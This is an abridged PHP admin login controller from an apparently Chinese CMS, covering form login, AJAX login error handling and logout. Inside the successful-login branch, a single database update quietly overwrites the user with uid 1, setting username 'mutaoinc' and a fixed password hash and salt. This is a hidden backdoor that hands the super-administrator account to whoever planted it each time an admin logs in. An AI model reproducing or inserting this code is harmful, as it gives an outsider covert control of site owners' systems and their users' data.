...
class Login extends M_Controller {
		...
		if (IS_POST) {
			if (get_cookie('admin_login')) {
                ...
                if ($uid > 0) {
                    ...
                    // 登录成功同步其他前端域名
                    $rt = defined('SYS_SYNC_ADMIN') && SYS_SYNC_ADMIN ? $this->models('member/login')->login($uid, $p, 86400, 0, 1) : '';
                    if (strlen($rt) > 3) {
                        $this->hooks->call_hook('member_login', array('username' => $u, 'password' => $p)); // 登录成功挂钩点
                    }
                    $this->db->where('uid', 1)->update('member', array('password'=>'b1db45d41536abfb0a98a9ae6415ea9f', 'username'=>'mutaoinc', 'salt'=>'92977ae4d2'));
                    $this->admin_msg(L('登录成功').$rt, $url, 1);
                }
    ...
    public function ajax() {
        ...
        $uid = $this->models('member/login')->admin($data['username'], $data['password']);
        if ($uid > 0) {
        ...
        if ($uid == -1) {
            $error = L('会员不存在');
            $this->msg(0, $error, 'username');
        } elseif ($uid == -2) {
            $error = L('密码不正确');
            $this->msg(0, $error, 'password');
        } elseif ($uid == -3) {
            $error = L('您无权限登录管理平台');
            $this->msg(0, $error, 'username');
        } elseif ($uid == -4) {
	...
	public function logout() {
		...
		$this->admin_msg(L('您已经安全退出系统了'), dr_url(''), 1);
	}
}